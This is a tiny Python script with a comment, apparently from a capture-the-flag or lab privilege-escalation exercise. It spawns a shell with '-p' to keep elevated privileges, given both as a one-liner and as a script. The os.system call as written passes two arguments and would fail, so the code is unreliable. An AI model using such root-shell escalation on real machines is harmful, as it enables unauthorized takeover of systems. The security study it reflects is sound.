#!/usr/bin/python
# I ended up escalating from within the machine without using this file, but this was the command
# to get the root shell. I just called it as
# /usr/bin/python -c 'import os; os.system("/bin/sh", "-p")'

import os

os.system("/bin/sh", "-p")
